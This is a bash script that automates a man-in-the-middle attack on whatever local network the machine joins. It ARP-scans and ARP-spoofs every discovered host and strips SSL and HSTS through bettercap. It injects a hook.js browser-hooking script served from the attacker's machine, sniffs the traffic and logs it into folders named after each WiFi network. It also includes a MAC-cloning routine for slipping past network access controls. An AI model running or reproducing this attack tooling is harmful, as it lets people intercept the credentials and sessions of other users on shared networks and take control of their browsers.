#!/bin/bash

# Check if the script is run as root
rootperm(){
  if [ "$(id -u)" -ne 0 ]; then
      echo -e "\033[1;91m\n[!] This script must be run as root. ¯\_(ツ)_/¯\n\033[0m"
    exit_msg="\n[++] Shutting down ... Goodbye. ( ^_^)／\n"
    echo -e "$exit_msg"
      exit 1
  fi

}

#rootperm
#./.rootperm.sh

Iface=$(ip -o link show | awk -F': ' '{print $2}' | xargs -I {} sh -c 'ip address show dev {} | grep -q "state UP" && echo {}' | head -n 1)

macchanging() {
for each in {1..3}
	do
	sudo arp-scan -l | awk '$2 ~ /:/' >> neww
	done
sort +2 -u neww > new && rm neww

cat new | awk '{ print $2}' > MACs
cat new | awk '{ print $1}' > IPs
mapfile -t array < MACs
rm -rf ups

i=0
len=${#array[@]}
wget -q --spider http://google.com
until [ $? -eq 1 ];
do
    #echo ${array[$i]}
    sudo ifconfig $Iface down && sudo macchanger -m ${array[$i]} $Iface && sudo ifconfig $Iface up

    let i++

done

macchanger -s $Iface
}

#macchanging

start() {
    #CHANGING MAC-ADDRESS
  #macchanging

  wget -q --spider http://google.com

  if [ $? -eq 0 ];
  then
  sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
  sudo systemctl stop nginx.service
  sudo systemctl start apache2.service

  #for i in 1 2 3 4; do sudo arp-scan -l >> output.txt; done
  #tail -n +3 output.txt | head -n -3 > final.txt && rm output.txt
  #awk '{ print $1}' final.txt > ip.txt  && rm final.txt

  sudo arp-scan -l > 1.txt
  sudo arp-scan -l > 2.txt
  sudo arp-scan -l > 3.txt
  sudo arp-scan -l > 4.txt
  tail -n +3 1.txt | head -n -3 > 0.txt && rm 1.txt
  tail -n +3 2.txt | head -n -3 > 1.txt && rm 2.txt
  tail -n +3 3.txt | head -n -3 > 2.txt && rm 3.txt
  tail -n +3 4.txt | head -n -3 > 3.txt && rm 4.txt
  awk '{ print $1}' 0.txt 1.txt 2.txt 3.txt > ip.txt
  perl -ne 'print unless $dup{$_}++;' ip.txt > ips.txt
  rm 0.txt 1.txt 2.txt 3.txt ip.txt
  sed -n -e 'H;${x;s/\n/,/g;s/^,//;p;}' ips.txt > finished.txt
  #rm ips.txt
  b=$(cat finished.txt)
  #getting only my ip address
  c=$(hostname -I) && d=$(echo -n "${c//[[:space:]]/}")


  #scripting bettercap caplet
  #make sure also run caplets.update for the first time and get all caplets then replace the hstshijack with the one that comes with this file
  #sudo rm -rfv /usr/local/share/bettercap/caplets/hstshijack
  #sudo cp -rfv hstshijack /usr/local/share/bettercap/caplets

  #send old files to VPS
  


  current_dir=$(pwd)
  echo -e $"net.probe on\nset http.proxy.sslstrip true\nset https.proxy.sslstrip true\nset http.proxy.inject.js $d:3000/hook.js\nhttp.proxy on\nset arp.spoof.fullduplex true \nset arp.spoof.targets $b \narp.spoof on\nnet.sniff on\nhstshijack/hstshijack" > spoof.cap
  rm -rf finished.txt

  wifi_name=$(iwgetid -r)
  cd "$current_dir"/all_traffics/ && [ -d "$wifi_name" ] || mkdir "$wifi_name"


  #Iface=$(nmcli -g DEVICE connection show --active | grep -E '^wlan' | awk '{print $1}')
  cd .. &&
  #sudo bettercap -iface $Iface -caplet spoof.cap | tee "$current_dir/all_traffics/$wifi_name/$(date '+%Y-%m-%d_%H-%M-%S').txt"
  sudo bettercap -iface $Iface -caplet spoof.cap | tee -a "$current_dir/all_traffics/$wifi_name/$(date '+%Y-%m-%d').txt"


  else
  #internet not connected
    echo "Check your internet connection!"
  fi

}



# Check if anything is using port 8080
if sudo lsof -i :8080; then
    # If something is using the port, kill the process
    sudo kill -9 $(sudo lsof -t -i :8080)
    start
else
    start
fi

